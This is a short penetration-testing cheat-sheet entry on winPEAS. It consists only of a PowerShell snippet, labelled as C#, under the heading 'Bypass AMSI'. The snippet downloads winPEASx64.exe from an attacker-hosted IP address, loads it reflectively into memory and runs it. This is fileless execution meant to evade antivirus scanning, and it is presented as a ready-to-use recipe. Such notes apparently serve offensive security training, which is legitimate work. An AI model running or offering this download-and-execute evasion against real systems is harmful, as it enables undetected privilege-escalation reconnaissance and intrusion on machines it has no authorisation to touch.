# winPEAS

## Bypass AMSI

```csharp
$ass = (new-object net.webclient).DownloadData('http://192.168.49.99/tools/winPEASx64.exe')
$assem = [System.Reflection.Assembly]::Load($ass)
[WinPEAS.Program]::main("")
```

